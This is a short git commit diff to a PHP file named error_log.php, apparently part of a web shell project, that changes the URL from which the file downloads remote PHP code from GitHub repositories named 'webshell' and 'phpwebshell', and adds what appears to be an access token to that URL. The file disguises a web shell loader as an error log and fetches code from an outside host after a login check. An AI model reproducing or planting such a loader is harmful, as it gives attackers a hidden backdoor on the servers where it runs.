4c234b0fc42047bf7673f29e173abdff01fb7e2c
sibueee <50735578+sibueee@users.noreply.github.com>
2024-08-13 01:05:18 +0700

    Update error_log.php

--- error_log.php
+++ error_log.php
@@ -50,7 +50,7 @@ if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
     exit;
 }
 
-$url = 'https://raw.githubusercontent.com/sibueee/webshell/main/error_log.php';
+$url = 'https://raw.githubusercontent.com/sibueee/phpwebshell/main/error.php?token=GHSAT0AAAAAACUE5KND6XFH36DAGGJBHBN6ZV2J4GQ';
 $kode = file_get_contents($url);
 if ($kode === FALSE) {
     die('Error fetching code from URL.');
